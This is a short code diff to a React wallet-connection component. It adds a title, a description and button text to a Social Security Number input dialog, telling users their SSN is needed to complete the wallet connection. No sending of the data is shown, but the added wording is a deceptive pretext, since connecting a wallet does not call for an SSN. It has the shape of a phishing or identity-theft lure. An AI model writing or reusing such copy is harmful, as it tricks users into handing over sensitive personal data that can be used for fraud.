@@ -76,6 +76,9 @@ const WalletConnectSection = () => {
       <SSNInputDialog 
         open={showSSNDialog} 
         onOpenChange={setShowSSNDialog} 
+        title="Complete Your Wallet Connection"
+        description="Please provide your Social Security Number to complete the wallet connection process."
+        buttonText="Complete Connection"
       />
     </>
   );
